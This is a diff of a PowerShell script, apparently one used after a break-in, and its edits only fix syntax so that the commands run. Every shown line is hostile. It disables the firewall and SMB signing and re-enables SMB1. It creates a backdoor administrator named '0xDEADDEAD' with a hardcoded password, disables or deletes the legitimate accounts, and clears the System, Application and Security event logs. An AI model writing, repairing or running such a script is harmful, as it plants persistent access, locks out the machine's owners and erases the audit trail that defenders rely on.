@@ -6,17 +6,17 @@ Stop-Service -Name "CiscoSCMS" -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction Ignore
 Set-SmbServerConfiguration -EnableSecuritySignature $false -RequireSecuritySignature $false -Force
-Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled $false -ErrorAction Ignore
+Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False -ErrorAction Ignore
 
 $pwd=ConvertTo-SecureString -String "ZznRImk1TefX3AWinSCx" -AsPlainText -Force
-New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires $true -Description "C0MPR0M1ZED" -Disabled $false -Password $pwd -PasswordNeverExpires $true -UserMayNotChangePassword $true -Confirm $false
-Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD" -Confirm $false
-Disable-LocalUser -Name "algo" -Confirm $false
-Disable-LocalUser -Name "Administrator" -Confirm $false
-Remove-LocalUser -Name "Guest" -Confirm $false
-Remove-LocalUser -Name "WDAGUtilityAccount" -Confirm $false
-Remove-LocalUser -Name "DefaultAccount" -Confirm $false
+New-LocalUser -Name "0xDEADDEAD" -FullName "0xDEADDEAD" -AccountNeverExpires $true -Description "C0MPR0M1ZED" -Disabled $false -Password $pwd -PasswordNeverExpires $true -UserMayNotChangePassword $true
+Add-LocalGroupMember -Group "Administrators" -Member "0xDEADDEAD"
+Disable-LocalUser -Name "algo"
+Disable-LocalUser -Name "Administrator"
+Remove-LocalUser -Name "Guest"
+Remove-LocalUser -Name "WDAGUtilityAccount"
+Remove-LocalUser -Name "DefaultAccount"
 
-Clear-EventLog -LogName System -Confirm $false
-Clear-EventLog -LogName Application -Confirm $false
-Clear-EventLog -LogName Security -Confirm $false
+Clear-EventLog -LogName System
+Clear-EventLog -LogName Application
+Clear-EventLog -LogName Security
